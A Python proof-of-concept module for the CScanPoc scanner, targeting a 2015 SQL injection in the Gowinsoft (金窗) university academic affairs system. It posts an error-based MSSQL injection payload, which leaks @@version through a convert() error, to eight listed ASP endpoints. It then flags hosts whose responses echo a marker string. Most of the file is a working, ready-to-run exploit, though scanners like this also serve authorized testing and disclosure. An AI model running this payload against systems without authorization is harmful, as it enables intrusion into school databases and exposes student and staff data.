# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Gowinsoft_0004'  # 平台漏洞编号，留空
    name = '金窗教务系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-16'  # 漏洞公布时间
    desc = '''
        金窗教务管理系统是为高校数字校园建设提供的技术解决方案。 
        金窗教务管理系统通用型SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0120584'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金窗教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd7082f5f-4a5a-4ee0-b00f-fe4c85207f1a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # post型
            payloads2 = [
                self.target + '/web/web/kebiao/kebiao.asp',
                self.target + '/web/web/jiu/yrdw.asp',
                self.target + '/web/web/jiu/yrxx.asp',
                self.target + '/web/web/jiu/qzxx.asp',
                self.target + '/web/web/lanmu/lqxx.asp',
                self.target + '/jiaoshi/sj/shixi/search.asp',
                self.target + '/web/web/bao/kaike.asp',
                self.target + '/web/web/lanmu/zsjh.asp'
            ]
            post = 'selw=%C8%AB%B2%BF&sel1w=%C8%AB%B2%BF&ww=1%27+and+1%3Dconvert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))+and+%27%25%27%3D%27&o=id+desc&id=0&y=1&act=&dizhi=%2Fweb%2Fweb%2Fjiu%2Fyrdw.asp%3F&w1=&w2=&sw1=&p=10&twid=750&wid=100%2C100%2C100%2C100%2C100%2C300%2C100%2C100%2C100%2C100&vrul=y%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy&m=%CF%C2%B9%FD%CF%D4%B2%E9&rul=%CE%C4%2C%CE%C4%2C%CE%C4%2C%CE%C4%2C%CE%C4%2C%C6%AA&h=%D3%C3%C8%CB%B5%A5%CE%BB%D0%C5%CF%A2&rig=%CE%DE&bh=6253'
            for payload in payloads2:
                code, head, res, err, _ = hh.http(
                    payload, post=post, referer=payload)
                # print payload
                # print res
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    #security_hole('SQL injection: ' + payload + " POST: "+post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=payload))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
